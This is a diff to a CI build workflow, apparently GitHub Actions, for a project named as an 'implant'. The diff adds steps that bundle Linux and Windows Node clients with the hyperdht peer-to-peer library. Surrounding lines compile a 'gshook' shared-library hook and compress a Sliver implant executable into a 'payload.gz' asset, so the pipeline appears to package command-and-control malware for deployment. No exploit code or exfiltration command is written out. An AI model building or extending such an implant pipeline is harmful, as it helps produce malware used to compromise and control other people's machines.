@@ -29,6 +29,11 @@ jobs:
         with:
           go-version: '1.21'
 
+      - name: Set up Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
       - name: Install build dependencies
         run: |
           sudo apt-get update
@@ -40,6 +45,24 @@ jobs:
           gcc -shared -fPIC -o ../libgshook.so gshook.c -ldl
           ls -lh ../libgshook.so
           file ../libgshook.so
+
+      - name: Bundle client.js with dependencies
+        run: |
+          cd implant/core/assets
+          npm init -y
+          npm install hyperdht
+          npm install -g esbuild
+
+          # Bundle client.js with all dependencies into single file
+          esbuild client.js --bundle --platform=node --target=node20 --outfile=client.bundle.js
+
+          # Replace client.js with bundled version
+          mv client.bundle.js client.js
+
+          # Verify bundle
+          echo "=== Bundled client.js size ==="
+          ls -lh client.js
+          head -5 client.js
 
       - name: Download Node.js Linux x64
         run: |
@@ -142,6 +165,28 @@ jobs:
         with:
           go-version: '1.21'
 
+      - name: Set up Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Bundle client-windows.js with dependencies
+        run: |
+          cd implant/core/assets
+          npm init -y
+          npm install hyperdht
+          npm install -g esbuild
+
+          # Bundle client-windows.js with all dependencies into single file
+          esbuild client-windows.js --bundle --platform=node --target=node20 --outfile=client-windows.bundle.js
+
+          # Replace with bundled version
+          mv client-windows.bundle.js client-windows.js
+
+          # Verify bundle
+          echo "=== Bundled client-windows.js size ==="
+          ls -lh client-windows.js
+
       - name: Download Node.js Windows x64
         run: |
           curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-win-x64.zip" -o node-windows.zip
@@ -207,7 +252,7 @@ jobs:
           # Compress Sliver payload
           gzip -c sliver-implant-windows.exe > implant/core/assets/payload.gz
 
-          # Use Windows-specific client
+          # Use Windows-specific bundled client
           cp implant/core/assets/client-windows.js implant/core/assets/client.js
 
           ls -lh implant/core/assets/
